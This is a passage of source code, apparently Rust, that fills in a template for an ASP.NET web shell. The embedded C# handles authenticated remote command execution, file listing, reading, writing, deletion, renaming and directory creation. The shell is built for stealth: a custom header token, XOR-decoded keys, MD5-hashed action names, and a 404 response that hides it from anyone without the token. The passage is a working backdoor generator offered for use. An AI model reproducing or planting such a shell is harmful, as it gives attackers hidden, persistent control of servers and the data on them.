    catch (Exception) {{ return "{{\"ok\":false,\"error\":\"read failed\"}}"; }}
}}
static string DSW_write(string p, string d, string o) {{
    try {{
        byte[] data = Convert.FromBase64String(d);
        long off = string.IsNullOrEmpty(o) ? 0 : long.Parse(o);
        using (var fs = new FileStream(p, FileMode.OpenOrCreate, FileAccess.Write)) {{
            fs.Seek(off, SeekOrigin.Begin);
            fs.Write(data, 0, data.Length);
        }}
        return "{{\"ok\":true,\"data\":null}}";
    }}
    catch (Exception) {{ return "{{\"ok\":false,\"error\":\"write failed\"}}"; }}
}}

static string DSW_del(string p) {{
    try {{ if (Directory.Exists(p)) Directory.Delete(p, true); else File.Delete(p); return "{{\"ok\":true,\"data\":null}}"; }}
    catch (Exception) {{ return "{{\"ok\":false,\"error\":\"delete failed\"}}"; }}
}}
static string DSW_ren(string f, string t) {{
    try {{ if (Directory.Exists(f)) Directory.Move(f, t); else File.Move(f, t); return "{{\"ok\":true,\"data\":null}}"; }}
    catch (Exception) {{ return "{{\"ok\":false,\"error\":\"rename failed\"}}"; }}
}}
static string DSW_mkdir(string p) {{
    try {{ Directory.CreateDirectory(p); return "{{\"ok\":true,\"data\":null}}"; }}
    catch (Exception) {{ return "{{\"ok\":false,\"error\":\"mkdir failed\"}}"; }}
}}
</script>
<%
string xk = "{xk}";
string gk = DSW_dec("{gk}", xk);
string token = Request.Headers[gk];
// 兜底：部分宿主只暴露 CGI 形式的服务器变量名（HTTP 前缀 + 下划线）
if (token == null) {{ token = Request.ServerVariables["HTTP_" + gk.Replace("-", "_").ToUpper()]; }}
if (token == null || token != DSW_dec("{token}", xk)) {{ Response.StatusCode = 404; Response.End(); return; }}
string fd = Request["formData"];
if (fd == null) {{ Response.End(); return; }}
{codec_decode}
string action = DSW_val(req, "a");
long h = Convert.ToInt64(DSW_md5(action).Substring(0, 8), 16);
string outv = "{{\"ok\":false,\"error\":\"unsupported\"}}";
if (h == {h_probe}) outv = DSW_env();
else if (h == {h_exec}) outv = DSW_exec(DSW_val(req, "c"), DSW_val(req, "w"));
else if (h == {h_list}) outv = DSW_list(DSW_val(req, "p"));
else if (h == {h_read}) outv = DSW_read(DSW_val(req, "p"), DSW_val(req, "o"), DSW_val(req, "l"));
else if (h == {h_write}) outv = DSW_write(DSW_val(req, "p"), DSW_val(req, "d"), DSW_val(req, "o"));
else if (h == {h_delete}) outv = DSW_del(DSW_val(req, "p"));
else if (h == {h_rename}) outv = DSW_ren(DSW_val(req, "f"), DSW_val(req, "t"));
else if (h == {h_mkdir}) outv = DSW_mkdir(DSW_val(req, "p"));
{codec_encode}
%>
"#,
        xk = xk,
        gk = gk_hex,
        token = token_hex,
        h_probe = h_probe,
        h_exec = h_exec,
        h_list = h_list,
        h_read = h_read,
        h_write = h_write,
        h_delete = h_delete,
        h_rename = h_rename,
        h_mkdir = h_mkdir,
        codec_helpers = codec_helpers,
        codec_decode = codec_decode,
        codec_encode = codec_encode,
    )
}
